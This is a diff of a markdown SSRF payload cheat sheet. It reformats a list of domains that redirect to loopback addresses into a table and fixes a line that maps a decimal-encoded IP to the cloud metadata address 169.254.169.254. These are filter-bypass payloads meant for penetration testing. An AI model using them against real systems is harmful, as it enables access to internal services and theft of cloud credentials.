@@ -110,11 +110,13 @@ http://0000::1:3128/ Squid
 
 ### Bypass localhost with a domain redirection
 
-
-* `spoofed.[BURP_COLLABORATOR]` such as `spoofed.redacted.oastify.com`
-* `localtest.me` redirect to `::1`
-* `company.127.0.0.1.nip.io` redirect to `127.0.0.1`
-* `bugbounty.dod.network` redirect to `127.0.0.2`
+| Domain                       | Redirect to |
+|------------------------------|-------------|
+| localtest.me                 | `::1`       |
+| localh.st                    | `127.0.0.1` |
+| spoofed.[BURP_COLLABORATOR]  | `127.0.0.1` |
+| spoofed.redacted.oastify.com | `127.0.0.1` |
+| company.127.0.0.1.nip.io     | `127.0.0.1` |
 
 The service nip.io is awesome for that, it will convert any ip address as a dns.
 
@@ -138,7 +140,7 @@ http://127.0.0.0
 http://2130706433/ = http://127.0.0.1
 http://3232235521/ = http://192.168.0.1
 http://3232235777/ = http://192.168.1.1
-http://2852039166/  = http://169.254.169.254
+http://2852039166/ = http://169.254.169.254
 ```
 
 ### Bypass using octal IP
